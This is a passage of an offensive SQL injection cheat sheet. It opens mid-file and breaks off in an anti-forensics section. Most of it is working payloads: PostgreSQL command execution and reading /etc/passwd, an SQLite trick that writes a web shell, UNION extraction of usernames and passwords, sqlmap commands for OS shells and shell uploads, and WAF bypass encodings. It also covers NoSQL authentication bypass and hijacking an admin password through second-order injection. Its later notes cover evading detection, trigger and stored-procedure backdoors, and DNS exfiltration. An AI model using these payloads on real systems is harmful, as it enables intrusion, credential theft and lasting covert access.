cmd_output FROM PROGRAM 'id';\n-- Large object for binary exfil:\nSELECT lo_import('/etc/passwd');\nSELECT lo_get(LOID);\n```\n\n### Oracle\n```sql\n-- Version: SELECT banner FROM v$version\n-- Current user: SELECT user FROM dual\n-- List tables: SELECT table_name FROM all_tables\n-- List columns: SELECT column_name FROM all_tab_columns WHERE table_name='USERS'\n-- No stacked queries in standard injection\n-- String concat: 'a'||'b'\n```\n\n### SQLite\n```sql\n-- Version: SELECT sqlite_version()\n-- List tables: SELECT name FROM sqlite_master WHERE type='table'\n-- List columns: PRAGMA table_info(table_name)\n-- File operations via ATTACH DATABASE\nATTACH DATABASE '/var/www/html/shell.php' AS pwned;\nCREATE TABLE pwned.cmd (payload text);\nINSERT INTO pwned.cmd VALUES ('');\n```\n\n## UNION-Based Extraction\n\n```sql\n-- Step 1: Determine column count\n' ORDER BY 1-- (increment until error)\n' UNION SELECT NULL-- (add NULLs until no error)\n\n-- Step 2: Find displayable columns\n' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n\n-- Step 3: Extract data\n' UNION SELECT username,password,NULL,NULL FROM users--\n' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--\n```\n\n## sqlmap Reference\n\n```bash\n# Basic\nsqlmap -u \"http://target/page?id=1\" --batch --dbs\n\n# POST data\nsqlmap -u \"http://target/login\" --data=\"user=admin&pass=x\" -p pass --batch\n\n# Cookie-based\nsqlmap -u \"http://target/page\" --cookie=\"session=abc; id=1*\" --batch\n\n# Headers\nsqlmap -u \"http://target/api\" --headers=\"X-Custom: 1*\" --batch\n\n# Specific technique\nsqlmap -u URL --technique=BEU # Boolean, Error, Union only\n\n# OS shell (MySQL file write, MSSQL xp_cmdshell, PostgreSQL COPY)\nsqlmap -u URL --os-shell\n\n# File operations\nsqlmap -u URL --file-read=\"/etc/passwd\"\nsqlmap -u URL --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"\n\n# Tamper scripts (WAF bypass)\nsqlmap -u URL --tamper=space2comment,between,randomcase\nsqlmap -u URL --tamper=charunicodeencode # Unicode encoding\n```\n\n## WAF Bypass Techniques\n\n```sql\n-- Case variation\nSeLeCt * FrOm users\n\n-- Comment insertion\nSEL/**/ECT * FR/**/OM users\nUN/**/ION SEL/**/ECT 1,2,3\n\n-- Whitespace alternatives\nSELECT%09*%09FROM%09users -- tab\nSELECT%0a*%0aFROM%0ausers -- newline\nSELECT(*)FROM(users)\n\n-- URL encoding\n%53%45%4c%45%43%54 (SELECT)\n\n-- Double URL encoding\n%2553%2545%254c%2545%2543%2554\n\n-- HTTP Parameter Pollution\n?id=1&id=UNION&id=SELECT&id=1,2,3 (behavior varies by framework)\n\n-- Chunked Transfer Encoding\nTransfer-Encoding: chunked (split payload across chunks)\n\n-- Unicode normalization\n＇ (fullwidth apostrophe) may be normalized to '\n```\n\n## NoSQL Injection\n\n```javascript\n// MongoDB\n{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}} // auth bypass\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}} // extract password char by char\n\n// MongoDB $where\n{\"$where\": \"this.username == 'admin' && this.password.match(/^a/)\"}\n```\n\n## Second-Order Injection\n\nPayload is stored in the database and triggered when used in a different query:\n\n```\n1. Register username: admin'--\n2. Password reset triggers: UPDATE users SET password='new' WHERE username='admin'--'\n3. This resets the real admin's password\n```\n\n## GraphQL Injection\n\n```graphql\n# Introspection for schema discovery\n{ __schema { types { name fields { name } } } }\n\n# Injection in arguments\n{ user(id: \"1 OR 1=1\") { name email } }\n```\n\n## OpSec Notes\n\n- Error-based detection generates visible errors in logs\n- Time-based attacks are slow and may trigger timeout alerts\n- sqlmap's default User-Agent is signatured — use `--random-agent`\n- `--os-shell` writes files to disk — use sparingly\n- stacked queries (`;`) are database and driver dependent\n- WAF bypass effectiveness varies — test each technique individually\n\n---\n\n## ◈ ADVANCED\n\n### Exploitation Beyond Data Extraction\n\nSQL injection at the advanced level is not just about dumping tables. It is a gateway to operating system compromise, network pivoting, and persistent access.\n\n**MSSQL attack chains**: Enable `xp_cmdshell` for OS command execution, abuse linked servers to pivot across database instances on different hosts, use `sp_OACreate` to instantiate COM objects for file system access even when `xp_cmdshell` is disabled, or leverage `OPENROWSET` to connect to external attacker-controlled databases for data staging.\n\n**PostgreSQL extensions**: Beyond `COPY FROM PROGRAM`, attackers can create custom extensions in C that execute arbitrary code within the PostgreSQL process. The `pg_read_file` and `pg_ls_dir` functions (superuser) provide filesystem enumeration without OS shell access. Large Objects provide a binary-safe channel for uploading and downloading arbitrary files.\n\n**Oracle advanced exploitation**: `DBMS_SCHEDULER` allows job creation that executes OS commands as the Oracle service account. `UTL_TCP` / `UTL_HTTP` provide network socket access for port scanning and SSRF from the database tier. Java stored procedures (if the JVM is loaded) give full OS command execution.\n\n### Bypassing Modern Defenses (2026 Landscape)\n\n**ML-based WAF evasion**: Modern WAFs use machine learning classifiers trained on SQL syntax. Effective bypass strategies include:\n\n- **Semantic equivalence**: Replace `UNION SELECT` with `UNION ALL SELECT` or use `VALUES` clauses that produce identical results but differ syntactically from training data.\n- **Context-free grammar abuse**: Use database-specific syntax that is valid SQL but not represented in WAF training corpora, such as MySQL's `SELECT ... INTO @var` patterns or MSSQL's `CROSS APPLY` with `STRING_SPLIT`.\n- **Request smuggling combinations**: Pair SQLi payloads with HTTP request smuggling (CL.TE / TE.CL) so the WAF parses a different request boundary than the backend.\n- **JSON/XML SQL syntax**: MySQL 8+ and PostgreSQL support JSON operators (`->`, `->>`) and functions within queries. Embedding injection within JSON path expressions often evades pattern-based detection.\n\n**Prepared statement bypass in ORMs**: While parameterized queries prevent classic SQLi, many ORMs allow raw query fragments for complex operations. Target `.extra()`, `.raw()`, `Arel.sql()`, `$whereRaw()`, or Hibernate `createNativeQuery()` calls that accept string interpolation.\n\n### Timing-Channel Optimization\n\nNaive time-based blind extraction is slow (one bit per delay). Advanced techniques:\n\n- **Heavy query timing**: Instead of `SLEEP()`, use computationally expensive queries (e.g., Cartesian products of system tables) that produce measurable but WAF-invisible delays.\n- **Binary search with conditional ordering**: Use `ORDER BY CASE WHEN condition THEN col1 ELSE col2 END` and measure response size or rendering differences rather than time.\n- **Batch extraction via error messages**: In error-based contexts, extract multiple characters per request using `CONCAT` in error output, reducing total request count by 10x or more.\n- **DNS exfiltration parallelism**: Fire multiple OOB DNS queries simultaneously (one per character position) to extract an entire field value in a single HTTP request.\n\n### Post-Exploitation Persistence via SQL\n\n- **Trigger-based backdoors**: Create database triggers on authentication tables that insert a copy of valid credentials into an attacker-controlled table on every login.\n- **Stored procedure backdoors**: Create or modify stored procedures that execute attacker logic when called by the application during normal operation.\n- **View-based data interception**: Create views that replace legitimate tables and silently log or redirect data.\n- **Scheduled job persistence**: Database-native schedulers (SQL Server Agent, `pg_cron`, Oracle `DBMS_SCHEDULER`) can execute OS commands on a recurring schedule, surviving application redeployments.\n\n### Anti-Forensics\n\n- Avoid writing to disk when possible;
